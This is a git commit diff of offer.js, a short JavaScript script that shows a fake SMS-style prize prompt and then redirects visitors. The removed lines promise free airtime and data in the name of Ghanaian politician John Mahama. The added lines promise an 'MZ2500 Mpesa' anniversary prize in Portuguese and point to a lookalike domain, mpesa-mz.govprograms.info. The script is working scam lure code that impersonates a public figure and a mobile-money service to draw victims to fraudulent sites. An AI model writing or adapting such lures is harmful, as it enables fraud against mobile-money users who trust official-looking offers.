75c96fc6af5260b478b6b6f1350fa25850675db3
newsrock <newsrock3345@gmail.com>
2025-01-24 01:44:35 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'MZ2500'
+password=prompt('SMS: Parabéns, é elegível para receber o prémio de aniversário MZ2500 Mpesa, Por favor, pressione OK para reclamar o prémio ','MZ2500');
+if (password != 'MZ2500') {
+location.href='https://mpesa-mz.govprograms.info/ofertas';
 }
